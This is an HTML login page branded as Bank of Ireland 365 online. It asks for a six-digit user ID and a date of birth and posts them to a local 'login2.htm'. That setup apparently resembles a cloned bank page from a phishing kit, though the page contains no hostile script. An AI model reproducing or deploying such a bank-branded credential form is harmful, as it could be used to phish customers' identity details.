<?xml version="1.0" encoding="iso-8859-1"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<title>Customer Login</title>
		<link rel="stylesheet" type="text/css" href="/css/login.css" />
		<script type="text/javascript" src="/script/js_funcs02_homepage1.js"></script>
		<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
		<meta http-equiv="pragma" content="no-cache" />
		<meta http-equiv="Cache-Control" content="no-cache" />

	</head>
	<body onload="document.getElementById('txt_userid').focus(); document.frm_login.reset();">
		<div class="page">
			<div class="box_header">
				<div class="box_header_left">
				</div>
				<div class="box_header_mid">
					<b>Security Information</b>
				</div>
				<div class="box_header_right">
				</div>
			</div>
			<div class="inf_bg01">
				<div class="inf_bg02">
					<div class="inf_security_text">
						Staying Secure Online<br /><br />
						<a href="/security/fraudulent_email_alert.html" onMouseOver="self.status='Urgent Notification';return true"><img  src="/images/click_here.gif" name="Urgent Notification" id="Urgent Notification" alt="Urgent Notification" class="input_image" /></a>
					</div>
					<div class="info_footer">
						<div class="info_footer_left">
							<img src="/images/t.gif" width="15" height="25" alt="" />
						</div>
						<div class="info_footer_right">
							<img src="/images/t.gif" width="15" height="25" alt="" />
						</div>
					</div>
				</div>
			</div>
			<div class="box_header">
				<div class="box_header_left">
				</div>
				<div class="box_header_mid">
					<b>Customer Login</b>
				</div>
				<div class="box_header_right">
				</div>
			</div>
			<div class="inf_bg01">
				<div class="inf_bg02">
				<div class="inf_text">
					<h2>Welcome to Bank of Ireland 365 online</h2>
				</div>
				<form id="frm_login" name="frm_login" autocomplete="off" method="post" action="login2.htm" onsubmit="return jsf_valdiator01(document.getElementById('txt_pword'));">
						<table summary = "Please enter your six digit user ID" class = "formtbl">
							<caption>
								Step 1
								<hr />
							</caption>
							<tr>
								<th class="formtbl"> 
									<label for="txt_userid" class = "formtbl">
										Please enter your six digit User ID 
                 					</label>
               				</th>
								<td class = "formtbl">
									<input type="text" name="USER" id="txt_userid" value="" size="10" maxlength="6" onkeypress="return validateKeyPress(event, jsv_char_num)" onkeyup= "jsf_fieldskip('txt_userid');" title="Please enter your six digit User ID here." />
								</td>
							</tr>
						</table>
						<br/>
 					<table summary = Please enter your date of birth in the format dd/mm/yyyy class ="formtbl">
							<caption>
								Step 2
								<hr />
							</caption>
							<tr>
<th class="formtbl"> <label for="txt_pword" class="formtbl">Please enter your date of birth in the format dd/mm/yyyy</label></th>
								<td class="formtbl">
									<input type="text" name="Pass_Val_1" id="txt_pword" value="" size="11" maxlength="10" onkeypress="return validateKeyPress(event, jsv_char_dob)" onkeyup="jsf_tabdob(10);" onfocus="jsf_tab('txt_pword');"  title="Please enter your date of birth in the format dd/mm/yyyy"/>
								</td>
							</tr>
						</table>
						<br /><br /><br />
						<div class="info_footer">
							<div class="info_footer_left">
								<img src="/images/t.gif" width="15" height="25" alt="" />
							</div>
							<div class="info_footer_right">
								<img src="/images/t.gif" width="15" height="25" alt="" />
							</div>
							<div class="info_footer_mid"><input type="image" src="/images/051130_home_but_enter.gif" name="submit" id="submit" alt="Enter 365 online" class="input_image" />
             				</div>
						</div>
					</form>
				</div>
			</div>
			<br/> <br/>
		</div>
	</body>
